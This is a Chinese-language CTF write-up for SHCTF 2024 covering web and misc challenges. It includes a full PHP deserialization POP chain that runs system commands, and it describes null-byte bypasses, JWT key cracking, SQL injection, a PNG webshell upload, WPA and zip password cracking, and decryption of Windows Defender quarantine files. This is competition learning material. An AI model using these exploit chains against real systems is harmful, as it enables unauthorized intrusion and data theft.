<p><img src="/resources/images/SHCTF2024WriteUpassert/1728397558348-dd960d9c-b7a8-4344-9224-72db33d15cda.webp" alt="image.png"></p>
<h2 id="·-蛐蛐-蛐蛐">· 蛐蛐?蛐蛐!</h2>
<p>F12查看：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397578288-b8fc4149-215e-4a39-a90e-2e39e3b0525d.webp" alt="image.png"></p>
<p>按提示打开source.txt:<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397590471-443f37b0-dea0-4004-a34c-2e1ddfcc2b3c.webp" alt="image.png"></p>
<p>想通过第一层if判断，需要Get方法传递的参数 ’ququ’ 值为114514且 反转后的 ’ququ’ 值不等于411511<br>
第一眼看上去好像是个不可能满足的条件，但是可以尝试一下类似00截断的方法欺骗条件判断再从第一个页面的html文件中得知 请求的是check.php<br>
则构造url：<a href="http://x.x">http://x.x</a>:x/check.php?ququ=114514%00<br>
得到回显：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397606639-e1567377-eae8-4d76-be1b-78a2b3b11571.webp" alt="image.png"></p>
<p>第二层条件判断要求POST方法传递的 ’ququ’ 值不为null<br>
第三层条件判断则要求POST方法传递的 ’ququ’ 值前6位必须为 ’ququk1’<br>
通过这两层判断则通过eval()执行POST过去的代码使用yakit构建POST请求包：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397625350-2e5e2cd8-0a55-45b0-b8c6-da9b75e3af3f.webp" alt="image.png"></p>
<p>​得知Flag在根目录，cat出flag内容即可。<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397632084-416c6db8-eba2-4bf0-8f64-62d058e05bb9.webp" alt="image.png"></p>
<h2 id="·-单身十八年的手速">· 单身十八年的手速</h2>
<p>F12直接查看源码，这是一个在本地运行的js<br>
混淆很多，但是不妨碍我们找到这个:<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397639856-f9de3199-697b-4486-98b2-3dd8099c344b.webp" alt="image.png"></p>
<p>一眼Base64，扔进解码器解码得：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397649046-7957957c-e16a-46ec-889f-4a973571f234.webp" alt="image.png"></p>
<h2 id="·-ez-gittt">· ez_gittt</h2>
<p>题目叫ezgit，想必是.git泄露访问/.git ，果然如此：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397766717-a366fd1b-eebf-41ab-a29c-3a19539ff74b.webp" alt="image.png"></p>
<p>先用GitHack看一眼，发现git克隆不全：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397779734-b0873ba9-ea48-463a-be9a-f9e4c4297105.webp" alt="image.png"></p>
<p>指定是index被做了手脚，010打开捉鬼：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397786136-0498f574-479f-4420-b085-893dd38e8e5e.webp" alt="image.png"></p>
<p><em>文件树都被删的只剩下index.html了</em></p>
<p>那就进.git\objects手工爆破吧找了个脚本：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397796780-432e1bff-f9f4-4db9-b4b5-8e2379a1ae05.webp" alt="image.png"></p>
<p>一个个试，第一个就出来了：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397804049-2fb1ec22-cff8-470f-a5bb-c5e2888dea30.webp" alt="image.png"></p>
<h2 id="·-Jvav">· Jvav</h2>
<p>是一个Java的在线执行环境<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397811278-01c22fe5-a3e4-457d-a0bc-19d1580de359.webp" alt="image.png"></p>
<p>整一段Java执行ls命令<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397817287-49b1a5e4-998a-4ae7-aaee-98781d1b22cd.webp" alt="image.png"></p>
<p>结果：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397823549-b8590e01-954d-4479-b7ac-fd3d162eaee0.webp" alt="image.png"></p>
<p>cat读取flag即可：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397837912-18f00bbb-69ea-445c-8f1c-3f9114b4608f.webp" alt="image.png"></p>
<h2 id="·-poppopop">· poppopop</h2>
<p>题目告诉了我们源码：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728398256760-527c7bbf-6b41-402d-a88f-83b8880415ac.webp" alt="image.png"></p>
<p>我们一个类一个类分析一下：</p>
<ol>
<li class="lvl-3">
<p>类SH定义了两个静态变量，初始值均为False</p>
</li>
<li class="lvl-3">
<p>类C定义了一个名叫flag的方法和一个公共变量，flag()的内容可以通过$p更改</p>
</li>
<li class="lvl-3">
<p>类T包含了一个__destruct()魔术方法，在本题中似乎会在反序列化后自动调用，同时会设置类SH中的$Web值为True</p>
</li>
<li class="lvl-3">
<p>类F包含了一个__toString()魔术方法，在包含它的类F被调用为字符串时自动执行，设置类SH中的$SHCTF值为真，同时$this-&gt;o-&gt;flag()使我们可以利用$o跳转到类C中的flag()方法，此时__toString()的值为‘其实。。。。，’</p>
</li>
<li class="lvl-3">
<p>类SHCTF包含了一个__invoke()魔术方法，在类SHCTF被调用的时候自动执行，其包含了一个条件判断：若类SH中的$Web为真，则输出“小丑竟是我自己呜呜呜~”，中间的($this-&gt;isyou)($this-&gt;flag)让我们可以通过$isyou,$flag【注意与flag()方法区分】执行任意指令，$Web为否不再赘述</p>
</li>
<li class="lvl-3">
<p>最后的部分则是获取通过GET方法传递的‘data’参数，base64解码data后传递给unserialize()进行反序列化分析完了，接下来就是<s>连连看</s>构造pop链了</p>
</li>
<li class="lvl-3">
<p>首先我们先实例化所有类：</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SH</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">T</span>();</span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$shctf</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SHCTF</span>();</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>链条嘛，有头有尾，我们先找头部，刚好这里有一个__destruct()会在最先开始的反序列化后自动执行，我们拿它下手：__destruct()里面有一个echo，刚好需要字符串输入，我们就把里面有__toString()的$f给它：</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$t</span>-&gt;n = <span class="variable">$f</span>;</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>$f被echo调用为字符串了，激活了__toString()，它里面没什么好跳转的，只有一个$this-&gt;o-&gt;flag()，我们就利用这个$o把$this-&gt;o-&gt;flag()指向$c里面那个flag()，也即$c-&gt;flag()</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$t</span>-&gt;n = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$f</span>-&gt;o = <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>现在跳转到了类C里面那个flag()，($this-&gt;p)()允许我们通过$c-&gt;p = ?调用一个函数，刚好我们有个在$shctf里面的__invoke()可以借此激活：</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$t</span>-&gt;n = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$f</span>-&gt;o = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$shctf</span>;</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>类SHCTF里面的条件判断我们已经在第一步满足了，这个时候我们就可以给 $isyou 和 $flag 赋值，以此执行我们的指令：</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$t</span>-&gt;n = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$f</span>-&gt;o = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$shctf</span>;</span><br><span class="line"><span class="variable">$shctf</span>-&gt;isyou = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$shctf</span>-&gt;flag = <span class="string">&#x27;ls /&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>我们再将它们序列化，顺便转成base64：</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SH</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">T</span>();</span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$shctf</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SHCTF</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;n = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$f</span>-&gt;o = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$shctf</span>;</span><br><span class="line"><span class="variable">$shctf</span>-&gt;isyou = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$shctf</span>-&gt;flag = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="variable">$ser</span>=<span class="title function_ invoke__">serialize</span>([<span class="variable">$sh</span>,<span class="variable">$t</span>,<span class="variable">$f</span>,<span class="variable">$c</span>,<span class="variable">$shctf</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$ser</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>构建url：<a href="http://x.x">http://x.x</a>:x/?data=你输出的base64复制粘贴</p>
</li>
<li class="lvl-3">
<p>得到回显：<img src="/resources/images/SHCTF2024WriteUpassert/1728401750772-817bd8a6-e9be-437e-9839-4eac36971323.webp" alt="image.png"></p>
</li>
<li class="lvl-3">
<p>我们得知flag在根目录下的flllag文件中，$shctf-&gt;flag = 'cat /flllag’即可</p>
</li>
<li class="lvl-3">
<p>最终flag：<img src="/resources/images/SHCTF2024WriteUpassert/1728401955994-ec3e2c76-b5f9-4ffb-9ddf-051627b17cb3.webp" alt="image.png"></p>
</li>
</ol>
<h2 id="·-登陆验证">· 登陆验证</h2>
<p><img src="/resources/images/SHCTF2024WriteUpassert/1728639787167-b2652081-f059-478c-a5a9-660604b316c1.webp" alt="c349d4768528b2c4b326690ae9ff113.jpg"></p>
<p>读题，考点为jwt，且告诉我们有密钥加密，需要爆破打开网站<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728640036381-da562b34-c424-4fc7-8f78-67bafeeb05aa.webp" alt="b2506910425de3ebd837570ab804cfa.jpg"></p>
<p>可以看到是一个登陆界面，考点不在登陆上，我们先尝试几个弱用户密码登陆，以获取cokkie<br>
尝试到用户名为admin，密码为admin时成功：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728640213411-5ace89ea-404c-443c-8e77-aa798aff829f.webp" alt="59955b207a851cb2319a755a7c2083f.jpg"></p>
<p>说我不是admin，那应该就是jwt在捣鬼了，拉到Yakit里面看一下先：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728642093039-8cf8402f-0617-4354-bb25-f5b5039b438d.webp" alt="image.png"></p>
<p>可以看到，在username，password验证之外还有一层token的验证。这个token前两部分是base64编码过的明文，第三部分则是密钥结合前两部分加密得出的签名，服务器端验证签名以确认token有效，而加密方式可以从第一部分了解到。我们直接使用jwt.io解码一下内容：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728642484279-c5db4567-57b7-4812-ba9e-fb7277bfdb15.webp" alt="image.png"></p>
<p>可以看到，'role’字段=user的捣鬼导致我们没有被认证为admin，当role=admin时即可验证通过。'alg’字段代表其加密方式为HS256，是对称式加密，加密算法为HMAC SHA-256，意味着我们可以暴力破解密钥以突破签名验证，更改role。不过在此之前我们还需要按照常规思路走一遍，验证一下更改加密方式为none时是否可以绕过签名校验，万一不用爆破了呢：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728643233480-68404f1c-0e11-4002-858d-3b7d102a360a.webp" alt="image.png"><br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728643243854-22a3031c-2fb8-4c4b-a866-df07c3cd0886.webp" alt="image.png"></p>
<p><img src="/resources/images/SHCTF2024WriteUpassert/1728643291666-a3c21e78-c3a6-494b-b605-bc1d696506cc.webp" alt="image.png"></p>
<p>很明显不行，那就老老实实爆破密钥，使用jwtcrack<a href="https://github.com/brendan-rius/c-jwt-cracker">这里</a>破解：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728643442743-6e110c53-3d54-4888-a508-10a1543b2cb2.webp" alt="image.png"></p>
<p>放了一个晚上出来了，再次利用jwt.io封装token：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728643570570-dabd4d70-5233-4a13-879e-5d3ea91dc906.webp" alt="image.png"></p>
<p>替换token请求，得到flag：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728643649794-21e4a456-075f-46cf-8194-8d07a7d38d21.webp" alt="image.png"></p>
<h2 id="·-guess-the-number">· guess_the_number</h2>
<p><img src="/resources/images/SHCTF2024WriteUpassert/1728887536480-bad8953e-3569-4006-a590-510d8c107abe.webp" alt="image.png"></p>
<p>F12查看源码先：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728887595814-bad60176-9515-473a-83a8-45224d569f51.webp" alt="image.png"></p>
<p>提示我们访问/s0urce路由，得到源码：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728887756893-9216a1f9-5b1b-483f-a230-939d709cdff6.webp" alt="image.png"></p>
<p>解读源码，发现/guess路由会获取我们传递的’num’参数，若我们传递的参数等于随机生成的second_num，则返回flag文件内容再看随机数生成段，先是随机生成一个七位的seed，然后再利用这个seed生成两个随机数，而first_num已经告诉我们了。爆破10位数的second_num不太现实，那么思路就是爆破7位的seed，通过seed获取second_num。制作爆破脚本，让ai帮我做了一下多进程优化以提高爆破效率：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_seed</span>(<span class="params">seed</span>):</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    <span class="keyword">if</span> random.randint(<span class="number">1000000000</span>, <span class="number">9999999999</span>) == <span class="number">3944680199</span>:</span><br><span class="line">        <span class="keyword">return</span> seed</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    seed_range = <span class="built_in">range</span>(<span class="number">1000000</span>, <span class="number">9999999</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> Pool(processes=multiprocessing.cpu_count()) <span class="keyword">as</span> pool:</span><br><span class="line"></span><br><span class="line">        results = pool.<span class="built_in">map</span>(test_seed, seed_range)</span><br><span class="line">        </span><br><span class="line">        valid_seeds = [seed <span class="keyword">for</span> seed <span class="keyword">in</span> results <span class="keyword">if</span> seed <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> valid_seeds:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到满足条件的seed值：<span class="subst">&#123;valid_seeds&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;没有找到满足条件的seed值。&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到seed值：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728888830627-a2f7dbc0-a239-4338-92cb-ef1c9410b997.webp" alt="image.png"></p>
<p>再利用seed生成second_num:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">seed =<span class="number">7267054</span></span><br><span class="line"></span><br><span class="line">random.seed(seed)</span><br><span class="line"></span><br><span class="line">first_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line">second_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (second_num)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出结果：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728889034367-d480aa5e-1455-491d-b30b-6606a880a736.webp" alt="image.png"></p>
<p>得到：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728889118062-aaa5600b-6858-43ba-acfb-1eccf778afcc.webp" alt="image.png"></p>
<h2 id="·-自助查询">· 自助查询</h2>
<p><img src="/resources/images/SHCTF2024WriteUpassert/1728889211878-d00967a2-9761-441e-a406-25d276b6cf03.webp" alt="image.png"></p>
<p>一眼sql注入，猜测是联合查询：先验证一下：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728889382059-bbec38c6-7e8b-4163-a2bf-401f304a0088.webp" alt="image.png"></p>
<p>有注入，但flag藏得比较深，可能在别的表；先找出整个的库：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728889522073-bc3ab7ff-02d8-4349-b092-5c92eaab934a.webp" alt="image.png"></p>
<p>得到库名为ctf；再找出这个库底下的所有表：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728889809798-d90089b6-4da1-469b-a289-df15eee6be0d.webp" alt="image.png"></p>
<p>得到两个表名，很明显我们的目标是flag库；查询flag库下的所有列名：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728889973110-4e4e17d1-2cb2-4bf3-8712-e2a04a4cecc5.webp" alt="image.png"></p>
<p>得到一个名叫’scretdata’的列，查询scretdata下的信息：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728890148654-977a1448-a302-4690-abde-de047d3ed1ae.webp" alt="image.png"></p>
<p>很可惜，flag不在里面，不过出题人提示了我们flag在注释里面，那就是要查询注释先从表注释开始吧：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728890366579-3bff1c2c-fb9f-45bc-a4b8-3528ec5f3b38.webp" alt="image.png"></p>
<p>没有结果，那就查字段注释：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728890420666-76f3e9a7-8c91-425a-bc64-1e3f56d0d228.webp" alt="image.png"></p>
<h2 id="·-拜师之旅·番外">· 拜师之旅·番外</h2>
<p><img src="/resources/images/SHCTF2024WriteUpassert/1729402772211-cdb13fd9-5931-410b-8f52-f8307fd5b84b.webp" alt="image.png"></p>
<p>很明显是个文件上传类型的题，先随便传个一句话马：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729402883842-70975e2f-c1eb-4747-8c42-58696d64d51c.webp" alt="image.png"></p>
<p>有验证，在图片里插个马再传：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729403121394-fbcea731-5c20-4f34-9f04-adc8c8ba25e6.webp" alt="image.png"></p>
<p><img src="/resources/images/SHCTF2024WriteUpassert/1729403158859-ef567597-10df-4319-93e3-9651d493d1f1.webp" alt="image.png"></p>
<p>还是不行，看来服务器端对上传的png文件数据做了校验那思路就是做一个图片数据中包含木马的png文件，且其可以通过数据校验网上已经有大佬的脚本可以生成这种文件<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729403804261-b3299f22-1473-47b7-99f6-e1484f7bf1f6.webp" alt="image.png"><br>
-&gt;<img src="/resources/images/SHCTF2024WriteUpassert/1729403856566-408e3263-725a-4a7c-97f2-a118900db21f.webp" alt="PngTrojan.png"></p>
<p>上传：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729403981308-c1c8a4e2-c703-449f-bbd0-8d94f115c0dc.webp" alt="image.png"></p>
<p>上传成功，服务器端对其进行了重命名，点开查看：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729404060010-a2da46cf-4e64-41fc-af3f-3fee6fae6733.webp" alt="image.png"></p>
<p>发现路径为/upload/xxx.png<br>
则构造payload:<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729404267554-51c01a1f-e05e-4e81-8f4a-205ff8eba2ce.webp" alt="屏幕截图 2024-10-16 182149.png"></p>
<p>得到flag</p>
<h2 id="·-小小cms">· 小小cms</h2>
<p>参考文章：<a href="https://blog.csdn.net/shelter1234567/article/details/138524342">链接</a>题目提示我们这个网站能被rce，根据以上文章构建请求包：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729404687954-e0b65b86-9663-4f3f-8c8b-22fa84dc7269.webp" alt="image.png"></p>
<p>得到flag</p>
<h1>Misc</h1>
<h2 id="·-有WiFi干嘛不用呢？">· 有WiFi干嘛不用呢？</h2>
<p><img src="/resources/images/SHCTF2024WriteUpassert/1728396792717-d136b3de-6ea7-47d4-9cdf-f0d09e590f79.webp" alt="image.png"></p>
<p>csv与xml文件均无有效信息，发现.cap文件是握手包，且被加密：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728396831838-12e739e3-1a8e-4dc8-8bee-a1732393fd70.webp" alt="image.png"></p>
<p>推测may文件夹内文件的文件名或文件内容是密钥利用以下代码读取并输出文件名与内容至txt文件中制作字典<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728396845526-d9d65f20-8bdb-4344-8902-687cc8964980.webp" alt="image.png"></p>
<p>使用aircrack-ng工具暴力破解cap包，得到密钥<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728396870331-4532f543-586f-4adc-a890-5f5c606939b9.webp" alt="image.png"></p>
<p>密钥即为Flag</p>
<h2 id="·-拜师之旅①"><strong>· 拜师之旅①</strong></h2>
<p>原始PNG文件无法打开,使用PCRT进行修复:<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397061082-0066ec87-7e70-4bd4-8946-bd892c990d30.webp" alt="image.png"></p>
<p>查看图片属性,发现分辨率为1520x1792<br>
这种图高度一般不会是这种数字,判断高度被篡改<br>
010改高度:<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397035364-2c68a087-d68b-4ffd-b319-33e5c11c3986.webp" alt="image.png"></p>
<p>得到<s>好图</s>Flag<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397050021-edd50fe7-1e6d-4943-8f39-93c4fd60ee3b.webp" alt="image.png"></p>
<h2 id="·-真真假假-遮遮掩掩">· 真真假假?遮遮掩掩!</h2>
<p>打开压缩包，发现被加密且为真加密<br>
010查看，发现文件尾部有提示信息<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397081728-05782d94-13e2-4209-b0a3-7676c9f00ade.webp" alt="image.png"></p>
<p>结合题目与提示信息格式，使用ARCHPR掩码爆破文件密码<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397088974-fa96bee9-f88f-4144-9e7e-490692a5e02b.webp" alt="image.png"></p>
<p>得到Flag：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397107658-985137b3-acc4-4139-8d7b-38c4911b02c9.webp" alt="image.png"></p>
<h2 id="·-Rasterizing-Traffic">· Rasterizing Traffic</h2>
<p>压缩包内是一个.pcapng文件，判断为抓到的数据包<br>
010打开，发现png文件<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397126430-61534e56-a7e4-4eb1-ad32-161039ac8e2e.webp" alt="image.png"></p>
<p>掐头去尾，得到以下图片：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397131935-211b63b7-22d0-4128-a444-c7883c889154.webp" alt="image.png"></p>
<p>Png的文件名已经提示我们这是一个光栅图，判断为横向隐写，先二值化图片：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397140223-62b2b9ea-1850-44f2-a089-00a49f626e87.webp" alt="image.png"></p>
<p><em>让脚本好发挥一点</em></p>
<p>利用Raster-Terminator提取出如下图片：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397195801-667b1ea8-819a-46d1-aae0-ce5ced6bf164.webp" alt="image.png"></p>
<p>在5-1至5-5得到Flag</p>
<h2 id="·-Quarantine"><strong>· Quarantine</strong></h2>
<p><img src="/resources/images/SHCTF2024WriteUpassert/1728397230077-c9176b50-df09-447d-bed7-addc721222b3.webp" alt="image.png"></p>
<p>hint提示我们这是一个被Windows Defender隔离的文件<br>
010打开看一眼，很明显是被加密过的：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397237748-b8b5ae47-6971-4c65-9e19-7dee9c62ce41.webp" alt="image.png"></p>
<p>既然被加密了那就要解密，通过万能的互联网我们检索到了两篇文章：<br>
·[Reverse, Reveal, Recover: Windows Defender Quarantine Forensics – Fox-IT International blog](<a href="https://www.yuque.com/rikoto/rr0r9n/ntosrpbuk1988usv#:~:text=Recovering">https://www.yuque.com/rikoto/rr0r9n/ntosrpbuk1988usv#:~:text=Recovering</a> files by investigating)<br>
·[How to Extract Quarantine Files from Windows Defender | Nikola’s Blog (<a href="http://reversingfun.com">reversingfun.com</a>)](<a href="https://www.yuque.com/rikoto/rr0r9n/ntosrpbuk1988usv#:~:text=C:%5CWindows%5CTemp%5Ceicar.txt">https://www.yuque.com/rikoto/rr0r9n/ntosrpbuk1988usv#:~:text=C:\Windows\Temp\eicar.txt</a>. As you can)<br>
总结一下提取到的信息：<br>
·Windows Defender 隔离的文件本体采用RC4加密<br>
·加密的密钥还是静态的，可以从第二篇Blog中获取密钥：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397251659-68ca22a4-3a3c-465d-86f4-878238b22886.webp" alt="image.png"></p>
<p>因为py环境崩了，这里我们就不使用Blog中提供的脚本了，寻找在线工具解决：先把文件转成Base64<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397260998-847606c5-527a-4c8a-9594-3b9a8da2674b.webp" alt="image.png"></p>
<p>再RC4解密：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397269793-02849314-2043-42ca-b0e8-945fd4d8a3e3.webp" alt="image.png"></p>
<p>可以看到本体是个一句话木马，后面跟了一串Base64编码的文件把那串Base64编码的文件拉去解密：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397297898-88d39cf6-4798-46d9-90e5-1a6cbd8d017e.webp" alt="image.png"></p>
<p>看到PK头了，很明显是个zip压缩包，内含flag，转成Hex导入010再导出获得zip文件：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397304933-286a02d5-c022-4f55-ace7-0397a67476ce.webp" alt="image.png"></p>
<p>但是被加密了，回010查看为真加密，且没有其他提示那就只能爆破了，先试下rockyou字典爆破，结果直接出来了：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397311369-b66ec1a4-08a6-4144-afa4-651649dc36aa.webp" alt="image.png"></p>
<h2 id="·-遮遮掩掩？CCRC">· 遮遮掩掩？CCRC!</h2>
<p>读题，题目提示我们这道题是针对zip的CRC32碰撞攻击。常规思路先走一遍，先查看压缩包内文件：</p>
<p>可以看到压缩包内有很多小体积的.txt文件，大小为3byte，文件大小在6byte以内，判断可以通过CRC碰撞获取文件内容。利用碰撞脚本<a href="https://github.com/AabyssZG/CRC32-Tools">这里</a>进行解密：<img src="/resources/images/SHCTF2024WriteUpassert/1728535048024-1591b818-d2d8-46f0-b4f8-cf30a1a02289.webp" alt="image.png"><br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728535739967-7d94b90b-8321-4eb7-94d3-df2daad8da1d.webp" alt="image.png"></p>
<p>脚本报错，很明显此路不通，不是传统的CRC32碰撞解密重新审题，发现关键点：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728535914374-1c88d1cb-84d5-424e-8afb-3e59b2383802.webp" alt="image.png"></p>
<p>资深冲浪选手肯定马上就能明白，这句话指向的是资源分享的圣堂：与熊论道<a href="http://hi.pcmoe.net/index.html">这里</a><br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728536208802-f03976b8-fdf9-457e-8e1b-4f744c92236d.webp" alt="image.png"></p>
<p>这是一个可以对文本进行特殊编码/解码的平台，一般编码后输出的内容开头会带有’熊曰‘字样，如：<img src="/resources/images/SHCTF2024WriteUpassert/1728536430183-8f64366f-183a-4817-b98e-df061efaa3f7.webp" alt="image.png"></p>
<p>题目提示到了，肯定有它的用处，而这里只有一个东西可以与其发生关联：zip内的文本文件。也就是说，zip内的文本文件很可能存储了熊曰编码后的文本，而这个文本形式是中文。验证一下：因为熊曰加密的第一个字符必为“呋”，我们将其输入文本文件中，查看其CRC32值并比对：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728537980132-4ba9dc09-6acd-42e5-9056-20acc58cf451.webp" alt="image.png"></p>
<p>可以看到，CRC32相同，大小也同为3byte<br>
那么CRC32碰撞不出结果的原因也出来了，原先脚本使用字库为所有可打印字符：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728537245917-943d5d83-a1b5-4a77-8f4e-79f84485edde.webp" alt="image.png"></p>
<p>输出一下，可以看见其中并不包含中文字符：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728537359383-c0e7fc4d-69bc-44a1-8806-f1db3b2b3412.webp" alt="image.png"></p>
